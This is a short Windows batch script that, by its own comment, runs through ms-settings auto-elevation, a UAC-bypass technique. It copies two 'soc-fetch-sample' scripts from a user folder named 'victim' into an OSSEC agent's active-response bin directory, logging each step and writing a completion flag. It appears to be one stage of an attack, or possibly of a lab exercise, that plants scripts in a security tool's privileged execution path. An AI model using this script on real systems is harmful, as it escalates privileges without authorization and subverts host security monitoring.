@echo off
rem elevated installer v2 - runs via ms-settings auto-elevation
set DST=C:\Program Files (x86)\ossec-agent\active-response\bin
copy /y "C:\Users\victim\soc-ar\soc-fetch-sample.cmd" "%DST%" >> "C:\Users\victim\soc-ar\elev_log.txt" 2>&1
copy /y "C:\Users\victim\soc-ar\soc-fetch-sample.ps1" "%DST%" >> "C:\Users\victim\soc-ar\elev_log.txt" 2>&1
echo done > "C:\Users\victim\soc-ar\elev_done.txt"
